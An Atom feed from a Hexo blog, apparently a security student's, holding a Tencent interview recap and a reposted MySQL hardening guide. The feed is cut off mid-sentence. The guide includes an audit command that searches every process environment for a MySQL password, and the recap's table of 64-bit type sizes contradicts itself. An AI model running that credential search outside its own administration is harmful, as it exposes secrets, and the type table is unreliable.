<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>白仁的博客</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://bai-ren-1.github.io/"/>
  <updated>2020-03-06T11:39:51.098Z</updated>
  <id>http://bai-ren-1.github.io/</id>
  
  <author>
    <name>白仁</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>面试腾讯</title>
    <link href="http://bai-ren-1.github.io/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/"/>
    <id>http://bai-ren-1.github.io/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/</id>
    <published>2020-03-06T10:32:26.000Z</published>
    <updated>2020-03-06T11:39:51.098Z</updated>
    
    <content type="html"><![CDATA[<h1 id="面试腾讯"><a href="#面试腾讯" class="headerlink" title="面试腾讯"></a>面试腾讯</h1><p>面试梦想中的腾讯，本以为做足了准备，还是缺少了很多事情（很多基础的知识得及时去复习，不然就会以为自己还记得，其实已经不记得了），有些沮丧。但很感谢面试官和耐心地一步一步引导我，让我又有了新的准备方向。</p><h2 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h2><ul><li>具体经历介绍，很具体包括过程，思路，收获（比赛，学到的漏洞和漏洞拓展的具体过程）</li><li>介绍一种熟悉漏洞，并说出怎么防御，并说出怎么绕过这个防御（XSS的防御变化和自己绕CSP打自己防御）</li><li>问漏扫项目怎么处理目录遍历这种路径一层一层的情况（枚举）</li><li>问怎么优化这个问题（得好好思考一下）</li><li>问有没有破解过游戏或者软件（crackme）</li><li>问32位int、unsign int所占字节数（4字节，也是4字节，出错于记忆和理解出错，难受了）</li><li>问具体过程（答了一种很简单的验证码绕过）</li><li>pe结构（会，但具体有些遗忘）</li><li>怎么给一个进程免杀（守护进程和hook api？）</li><li>文件水印算法（没有听说过）</li><li>问怎么设计一个水印算法（答文件分块后每块按哈希加密后拼接在后边）</li><li>如何对水印使用动态校验（得好好思考一下）</li><li>sql语句的编写（很难受，因为明明应该很流畅的，下面有复现）</li><li>为什么不能用order by然后limit？（只能选一条）</li><li>问一个具体场景的指针（更难受的地方，太久没使用把最基础的遗忘了还自以为准备充分）</li><li>问开发了一个第三方的API得注意什么（不被泄露给其他第三方，配置隐私）</li><li>给出具体场景就是一个根据id索引给出资料的API（不能枚举越权、SQL注入防止）</li><li>问答</li></ul><p>下面就那些比较简单的答案复现一下，以敲响警钟要全面和扎实一点。</p><h2 id="答案复现"><a href="#答案复现" class="headerlink" title="答案复现"></a>答案复现</h2><h3 id="占字节数"><a href="#占字节数" class="headerlink" title="占字节数"></a>占字节数</h3><ul><li><p>32位编译器：</p><ul><li><p>char：1个字节</p></li><li><p>short int : 2个字节</p></li><li><p>int： 4个字节</p></li><li><p>unsigned int : 4个字节</p></li><li><p>float: 4个字节</p></li><li><p>double:  8个字节</p></li><li><p>long:  4个字节</p></li><li><p>long long: 8个字节</p></li><li><p>unsigned long: 4个字节 </p></li></ul></li><li><p>64位编译器：</p><ul><li>short int : 2个字节</li><li>int： 4个字节</li><li>unsigned int : 4个字节</li><li>float: 4个字节</li><li>double:  8个字节</li><li>long:  4个字节</li><li>long long: 8个字节</li><li>unsigned long: 4个字节 </li><li>unsigned long: 8个字节 </li></ul></li></ul><h3 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h3><ul><li>找出成绩最高的学生的id：</li></ul><p><img src="/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/2.png" alt></p><p>顺便提醒了自己有关<strong>多表查询、子查询、谓词</strong>的复习</p><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><p>这个是最难受，连最简单指针的使用形式都忘记了，提醒自己得复习<strong>指针，引用，C++特性,数据结构</strong></p><p><img src="/2020/03/06/%E8%85%BE%E8%AE%AF%E9%9D%A2%E8%AF%95/1.png" alt></p><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul><li>继续深入挖掘漏洞，在攻防研究可以继续深入，进步还是比较快和大的。</li><li>不只是深入web安全，要把二进制相关的更进一步的学好（不能浅尝辄止）。</li><li>批评在开发基础的表现，不能学了安全就只把目光放在那几款安全开发。</li><li>复习数据结构，计网，操作系统等知识。</li></ul><h2 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h2><p>新的计划，得抽更多时间来进行了。加油，继续冲击腾讯！！！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;面试腾讯&quot;&gt;&lt;a href=&quot;#面试腾讯&quot; class=&quot;headerlink&quot; title=&quot;面试腾讯&quot;&gt;&lt;/a&gt;面试腾讯&lt;/h1&gt;&lt;p&gt;面试梦想中的腾讯，本以为做足了准备，还是缺少了很多事情（很多基础的知识得及时去复习，不然就会以为自己还记得，其实已经不记得了
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>MySQL安全配置</title>
    <link href="http://bai-ren-1.github.io/2020/03/04/MySQL%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"/>
    <id>http://bai-ren-1.github.io/2020/03/04/MySQL%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/</id>
    <published>2020-03-04T05:37:57.000Z</published>
    <updated>2020-03-04T07:46:43.225Z</updated>
    
    <content type="html"><![CDATA[<h1 id="MySQL安全配置"><a href="#MySQL安全配置" class="headerlink" title="MySQL安全配置"></a>MySQL安全配置</h1><p>本文转载自 <a href="https://blog.csdn.net/ilnature2008/article/details/54587553?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">https://blog.csdn.net/ilnature2008/article/details/54587553?depth_1-utm_source=distribute.pc_relevant.none-task&amp;utm_source=distribute.pc_relevant.none-task</a> </p><h2 id="0x00-Mysql配置文件"><a href="#0x00-Mysql配置文件" class="headerlink" title="0x00 Mysql配置文件"></a>0x00 Mysql配置文件</h2><ul><li>linux系统下是<code>my.conf</code></li><li>windows环境下是<code>my.ini</code></li></ul><p>下面以mysql 5.7版本为例，介绍mysql常见的安全策略、配置、加固方式等等，有些策略可能只针对Linux操作系统，更多策略可以参考<code>CIS Mysql Benchmark</code>相关文档</p><h2 id="0x01-操作系统级别安全配置"><a href="#0x01-操作系统级别安全配置" class="headerlink" title="0x01 操作系统级别安全配置"></a>0x01 操作系统级别安全配置</h2><h3 id="1-不要将数据库放在系统分区"><a href="#1-不要将数据库放在系统分区" class="headerlink" title="1. 不要将数据库放在系统分区"></a>1. 不要将数据库放在系统分区</h3><ul><li>Windows系统：</li></ul><p>直接检查是否将数据库放置在C盘。</p><ul><li>Linux系统：</li></ul><p>在终端连接上mysql数据库，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables where variable_name = &apos;datadir&apos;;</span><br></pre></td></tr></table></figure><p>然后返回shell命令行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df -h &lt;datadir&gt;</span><br></pre></td></tr></table></figure><p>其中datadir是上一条命令的返回值。</p><p>上述命令的返回值不应是<code>/、/var、/usr</code></p><h3 id="2-使用专用的最小权限账号运行mysql数据库进程"><a href="#2-使用专用的最小权限账号运行mysql数据库进程" class="headerlink" title="2. 使用专用的最小权限账号运行mysql数据库进程"></a>2. 使用专用的最小权限账号运行mysql数据库进程</h3><ul><li>Windows系统：</li></ul><p>直接打开任务管理器，查看运行mysql进程的操作系统账号，不能为administrator账号。</p><ul><li>Linux系统：</li></ul><p>Shell命令行运行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep mysql</span><br></pre></td></tr></table></figure><p>查看mysql服务的运行账号是否为root或其他高权限账号，如果是的，则需要创建一个非管理员专用账号来运行mysql服务。</p><h3 id="3-禁止使用mysql命令行历史记录"><a href="#3-禁止使用mysql命令行历史记录" class="headerlink" title="3. 禁止使用mysql命令行历史记录"></a>3. 禁止使用mysql命令行历史记录</h3><ul><li>Linux系统：</li></ul><p>执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name &quot;.mysql_history&quot;</span><br></pre></td></tr></table></figure><p>查看是否存在mysql的历史命令记录文件，如果存在，则需要进行如下加固：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）删除.mysql_history文件；</span><br><span class="line">（2）设置环境变量MYSQL_HISTFILE为/dev/null，并添加到shell的初始化脚本中，创建mysql_history到/dev/null的链接：</span><br><span class="line">ln -s /dev/null $HOME/.mysql_history</span><br></pre></td></tr></table></figure><h3 id="4-确保MYSQL-PWD环境变量未设置敏感信息"><a href="#4-确保MYSQL-PWD环境变量未设置敏感信息" class="headerlink" title="4. 确保MYSQL_PWD环境变量未设置敏感信息"></a>4. 确保MYSQL_PWD环境变量未设置敏感信息</h3><p>Windows系统下进入cmd命令行，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set</span><br></pre></td></tr></table></figure><p>查看是否设置了环境变量MYSQL_PWD。</p><p>Linux系统下使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep MYSQL_PWD /proc/*/environ</span><br></pre></td></tr></table></figure><p>查看MYSQL_PWD环境变量是否设置了敏感信息。</p><p>确认那个配置文件或脚本设置了MYSQL_PWD环境变量。</p><h2 id="0x02-安装"><a href="#0x02-安装" class="headerlink" title="0x02 安装"></a>0x02 安装</h2><h3 id="1-使用数据库专用服务器"><a href="#1-使用数据库专用服务器" class="headerlink" title="1. 使用数据库专用服务器"></a>1. 使用数据库专用服务器</h3><p>使用专用的服务器安装mysql服务可以减少mysql服务的攻击面，尽量卸载或删除操作系统上的不必要的应用或服务，减少其他应用的安装可能给mysql的运行带来的安全风险。</p><h3 id="2-不要复用数据库账号"><a href="#2-不要复用数据库账号" class="headerlink" title="2. 不要复用数据库账号"></a>2. 不要复用数据库账号</h3><p>运行mysql服务的操作系统账号不要用来运行其他应用或服务，这样可以避免其他应用或服务器被攻击给mysql服务带来影响。</p><h3 id="3-历史命令行密码设置为不可见"><a href="#3-历史命令行密码设置为不可见" class="headerlink" title="3. 历史命令行密码设置为不可见"></a>3. 历史命令行密码设置为不可见</h3><p>使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u admin -p password</span><br></pre></td></tr></table></figure><p>连接mysql数据库服务，退出后查看历史命令，确认password是否为明文。</p><p>建议使用如下命令方式登录：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（1）先输入mysql -u admin -p</span><br><span class="line">（2）根据命令行提示输入密码；</span><br><span class="line">而不要在一整条命令中输入密码。</span><br><span class="line">另外要控制mysql配置文件访问权限。</span><br></pre></td></tr></table></figure><h2 id="0x03-文件权限控制"><a href="#0x03-文件权限控制" class="headerlink" title="0x03 文件权限控制"></a>0x03 文件权限控制</h2><h3 id="1-控制数据目录的访问权限"><a href="#1-控制数据目录的访问权限" class="headerlink" title="1. 控制数据目录的访问权限"></a>1. 控制数据目录的访问权限</h3><p>数据目录是mysql数据库存放的位置，在mysql命令行界面下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables where variable_name = &apos;datadir&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;datadir&gt;/.. | egrep &quot;^d[r|w|x]&#123;3&#125;------\s*.\s*mysql\s*mysql\s*\d*.*mysql&quot;</span><br></pre></td></tr></table></figure><p>其中<datadir>是第一条命令的执行结果</datadir></p><p>如果存在问题，linux环境下在终端执行如下命令进行加固：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 700 &lt;datadir&gt;</span><br><span class="line">chown mysql:mysql &lt;datadir&gt;</span><br></pre></td></tr></table></figure><h3 id="2-控制二进制日志文件的权限"><a href="#2-控制二进制日志文件的权限" class="headerlink" title="2. 控制二进制日志文件的权限"></a>2. 控制二进制日志文件的权限</h3><p>mysql的运行会产生很多日志，例如二进制日志、错误日志、慢查询日志等等，Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;log_bin_basename&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;log_bin_basename&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;log_bin_basename.nnnnn&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="3-控制错误日志文件的权限"><a href="#3-控制错误日志文件的权限" class="headerlink" title="3. 控制错误日志文件的权限"></a>3. 控制错误日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;log_error&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;log_error&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;log_error&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="4-控制慢查询日志文件的权限"><a href="#4-控制慢查询日志文件的权限" class="headerlink" title="4. 控制慢查询日志文件的权限"></a>4. 控制慢查询日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;slow_query_log_file&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;slow_query_log_file&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;slow_query_log_file&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="5-控制通用日志文件的权限"><a href="#5-控制通用日志文件的权限" class="headerlink" title="5. 控制通用日志文件的权限"></a>5. 控制通用日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;general_log_file&apos;;</span><br></pre></td></tr></table></figure><p>在终端命令行执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls &lt;general_log_file&gt;.*</span><br></pre></td></tr></table></figure><p>对于发现的每一个文件，执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;general_log_file&gt; | egrep &quot;^-[r|w]&#123;2&#125;-[r|w]&#123;2&#125;----\s*.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;log file&gt;</span><br><span class="line">chown mysql:mysql &lt;log file&gt;</span><br></pre></td></tr></table></figure><h3 id="6-控制审计日志文件的权限"><a href="#6-控制审计日志文件的权限" class="headerlink" title="6. 控制审计日志文件的权限"></a>6. 控制审计日志文件的权限</h3><p>Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables where variable_name =  &apos;audit_log_file&apos;;</span><br></pre></td></tr></table></figure><p>在终端执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -l &lt;audit_log_file&gt; | egrep &quot;^-rw[-x]rw[-x][-r][-w][-x][ \t]*[0-9][ \t]*mysql[</span><br><span class="line">\t]*mysql.*$&quot;</span><br></pre></td></tr></table></figure><p>根据输出确认日志文件的权限设置是否存在问题。</p><p>对于每个日志文件，修改其权限和属组如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 660 &lt;audit_log_file&gt;</span><br><span class="line">chown mysql:mysql &lt;audit_log_file&gt;</span><br></pre></td></tr></table></figure><h2 id="0x04-通用安全"><a href="#0x04-通用安全" class="headerlink" title="0x04 通用安全"></a>0x04 通用安全</h2><h3 id="1-安装最新的补丁"><a href="#1-安装最新的补丁" class="headerlink" title="1. 安装最新的补丁"></a>1. 安装最新的补丁</h3><p>在mysql命令行下查询MySQL的版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES WHERE Variable_name LIKE &quot;version&quot;;</span><br></pre></td></tr></table></figure><p>确认是否由需要安装的补丁包，如果有请安装。</p><h3 id="2-删除test数据库"><a href="#2-删除test数据库" class="headerlink" title="2. 删除test数据库"></a>2. 删除test数据库</h3><p>Mysql数据库默认安装好后，存在一个名为test的数据库，如果存在，请执行如下命令删除：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Drop database “test”</span><br></pre></td></tr></table></figure><h3 id="3-确保读取本地文件的参数设置为失效"><a href="#3-确保读取本地文件的参数设置为失效" class="headerlink" title="3. 确保读取本地文件的参数设置为失效"></a>3. 确保读取本地文件的参数设置为失效</h3><p>Mysql命令行下，使用如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW VARIABLES WHERE Variable_name = &apos;local_infile&apos;;</span><br></pre></td></tr></table></figure><p>查看结果是否为OFF。</p><p>如果该命令为ON，则数据库用户可以通过LOAD DATA INFILE 或者 SELECT local_file 读取到数据库所在操作系统本地的文件，在这种情况下，需要在mysql配置文件中新增一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Local-infile=0；</span><br></pre></td></tr></table></figure><p>然后重启数据库服务。</p><h2 id="0x05-权限配置"><a href="#0x05-权限配置" class="headerlink" title="0x05 权限配置"></a>0x05 权限配置</h2><h3 id="1-控制可以访问所有数据库的账号"><a href="#1-控制可以访问所有数据库的账号" class="headerlink" title="1. 控制可以访问所有数据库的账号"></a>1. 控制可以访问所有数据库的账号</h3><p>Mysql数据库下的user表和db表中存放着可以授予数据库用户的权限，确保只有管理员账号才能访问所有数据库。可以访问mysql数据库的用户或许可以查看密码哈希值、修改用户权限等等。</p><p>使用如下sql语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT user, host FROM mysql.user</span><br><span class="line">WHERE (Select_priv = &apos;Y&apos;) OR (Insert_priv = &apos;Y&apos;) OR (Update_priv = &apos;Y&apos;)</span><br><span class="line">OR (Delete_priv = &apos;Y&apos;)  OR (Create_priv = &apos;Y&apos;)  OR (Drop_priv = &apos;Y&apos;);</span><br><span class="line">SELECT user, host FROM mysql.db WHERE db = &apos;mysql&apos;</span><br><span class="line">AND ((Select_priv = &apos;Y&apos;) OR (Insert_priv = &apos;Y&apos;) OR (Update_priv = &apos;Y&apos;)</span><br><span class="line">OR (Delete_priv = &apos;Y&apos;) OR (Create_priv = &apos;Y&apos;) OR (Drop_priv = &apos;Y&apos;));</span><br></pre></td></tr></table></figure><p>确保返回结果只能是数据库管理员账号。</p><h3 id="2-限制非管理员用户的权限"><a href="#2-限制非管理员用户的权限" class="headerlink" title="2. 限制非管理员用户的权限"></a>2. 限制非管理员用户的权限</h3><p>Mysql.user表中的权限列有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_priv：表示是否允许用户读取数据库所在主机的本地文件；</span><br><span class="line">Process：表示是否允许用户查询所有用户的命令执行信息；</span><br><span class="line">Super_priv：表示用户是否有设置全局变量、管理员调试等高级别权限；</span><br><span class="line">Shutdown_priv：表示用户是否可以关闭数据库；</span><br><span class="line">Create_user_priv：表示用户是否可以创建或删除其他用户；</span><br><span class="line">Grant_priv：表示用户是否可以修改其他用户的权限；</span><br></pre></td></tr></table></figure><p>应确保只有数据库管理员才有上述权限，使用如下sql语句查看拥有各个权限的数据库账号：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select user, host from mysql.user where File_priv = &apos;Y&apos;;</span><br><span class="line">select user, host from mysql.user where Process_priv = &apos;Y&apos;;</span><br><span class="line">select user, host from mysql.user where Process_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.user WHERE Shutdown_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.user WHERE Create_user_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.user WHERE Grant_priv = &apos;Y&apos;;</span><br><span class="line">SELECT user, host FROM mysql.db WHERE Grant_priv = &apos;Y&apos;;</span><br></pre></td></tr></table></figure><p>确保查询结果中不存在非管理员用户。</p><p>如果存在非管理员用户，使用如下命令进行权限回收：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">REVOKE FILE ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE PROCESS ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE SUPER ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE SHUTDOWN ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE CREATE USER ON *.* FROM &apos;&lt;user&gt;&apos;;</span><br><span class="line">REVOKE GRANT OPTION ON *.* FROM &lt;user&gt;;</span><br></pre></td></tr></table></figure><p>其中user为上述查询到的非管理员用户。</p><h3 id="3-合理控制DML-DDL操作授权"><a href="#3-合理控制DML-DDL操作授权" class="headerlink" title="3. 合理控制DML/DDL操作授权"></a>3. 合理控制DML/DDL操作授权</h3><p>DML/DDL语句包括创建或修改数据库结构的权限，例如insert、update、delete、create、drop和alter语句，在任何数据库中都要控制用户的此类权限，确保只授权给有业务需求的非管理员用户。Mysql命令行下执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT User,Host,Db FROM mysql.db WHERE Select_priv=&apos;Y&apos;</span><br><span class="line">OR Insert_priv=&apos;Y&apos; OR Update_priv=&apos;Y&apos; OR Delete_priv=&apos;Y&apos; OR Create_priv=&apos;Y&apos;</span><br><span class="line">OR Drop_priv=&apos;Y&apos; OR Alter_priv=&apos;Y&apos;;</span><br></pre></td></tr></table></figure><p>上述查询到的用户只能对特地的数据库才有相关的权限，使用如下命令进行相关权限的回收：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">REVOKE SELECT ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE INSERT ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE UPDATE ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE DELETE ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE CREATE ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE DROP ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br><span class="line">REVOKE ALTER ON &lt;host&gt;.&lt;database&gt; FROM &lt;user&gt;;</span><br></pre></td></tr></table></figure><p>其中<user>为查询到的未授权的用户，host为相关主机，database为相关数据库。</user></p><h2 id="0x06-审计和日志"><a href="#0x06-审计和日志" class="headerlink" title="0x06 审计和日志"></a>0x06 审计和日志</h2><h3 id="1-开启错误日志审计功能"><a href="#1-开启错误日志审计功能" class="headerlink" title="1. 开启错误日志审计功能"></a>1. 开启错误日志审计功能</h3><p>错误日志包括数据库运行和停止过程中的一系列活动信息，有助于分析数据库运行过程中的一些异常活动，一般情况下需要开启错误日志记录功能，使用如下命令查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW variables LIKE &apos;log_error&apos;;</span><br></pre></td></tr></table></figure><p>确保返回结果为非空，如果为空，需要在mysql数据库配置文件中增加相关配置。</p><h3 id="2-确保日志存放在非系统区域"><a href="#2-确保日志存放在非系统区域" class="headerlink" title="2. 确保日志存放在非系统区域"></a>2. 确保日志存放在非系统区域</h3><p>日志文件随着数据库的运行会不断增加，如果存放在系统区域，则会影响系统的正常运行，使用如下命令进行查询：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@global.log_bin_basename;</span><br></pre></td></tr></table></figure><p>确保返回结果不是如下路径：/、/var、/usr</p><h3 id="3-关闭原始日志功能"><a href="#3-关闭原始日志功能" class="headerlink" title="3. 关闭原始日志功能"></a>3. 关闭原始日志功能</h3><p>原始日志选项会决定一些敏感信息是否会被明文写进日志中，例如查询日志、慢查询日志、二进制日志，确保数据库配置文件中存在如下配置项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log-raw = OFF</span><br></pre></td></tr></table></figure><h2 id="0x07-认证"><a href="#0x07-认证" class="headerlink" title="0x07 认证"></a>0x07 认证</h2><h3 id="1-Old-passwords环境变量设置"><a href="#1-Old-passwords环境变量设置" class="headerlink" title="1. Old_passwords环境变量设置"></a>1. Old_passwords环境变量设置</h3><p>Old_passwords决定了使用PASSWORD()函数和IDENTIFIED BY 、CREATE USER 、GRANT 等语句是时的hash算法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0 - authenticate with the mysql_native_password plugin</span><br><span class="line">1 - authenticate with the mysql_old_password plugin</span><br><span class="line">2 - authenticate with the sha256_password 